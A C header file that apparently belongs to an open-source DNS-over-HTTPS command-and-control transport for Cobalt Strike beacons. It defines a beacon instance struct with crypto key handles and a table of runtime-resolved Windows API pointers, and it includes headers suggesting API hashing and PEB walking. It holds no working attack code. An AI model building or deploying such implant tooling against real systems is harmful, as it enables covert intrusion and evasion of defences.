/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

#include <windows.h>
#include <wincrypt.h>
#include <windns.h>

#include "macros.h"
#include "hashes.h"

typedef struct
{
	ULONG BeaconId;

	struct
	{
		PVOID Ptr;
		ULONG Len;
		HCRYPTKEY Key;
		HCRYPTPROV Provider;
	} key[ 4 ];

	struct
	{
		FUNC( LocalLock );
		FUNC( LocalFree );
		FUNC( LocalSize );
		FUNC( LocalAlloc );
		FUNC( FreeLibrary );
		FUNC( LocalUnlock );
		FUNC( LocalReAlloc );
		FUNC( LoadLibraryA );
		FUNC( CryptDecrypt );
		FUNC( CryptEncrypt );
		FUNC( CryptImportKey );
		FUNC( CryptCreateHash );
		FUNC( CryptDestroyKey );
		FUNC( CryptDestroyHash );
		FUNC( CryptSetKeyParam );
		FUNC( CryptDecodeObjectEx );
		FUNC( CryptReleaseContext );
		FUNC( CryptAcquireContextA );
		FUNC( CryptImportPublicKeyInfo );
		FUNC( DnsWriteQuestionToBuffer_UTF8 );
		FUNC( DnsExtractRecordsFromMessage_UTF8 );
	} api;

	HMODULE Module[ 4 ];

} BEACON_INSTANCE, *PBEACON_INSTANCE;

#include "tebpeb.h"
#include "crypt.h"
#include "hash.h"
#include "peb.h"
#include "pe.h"
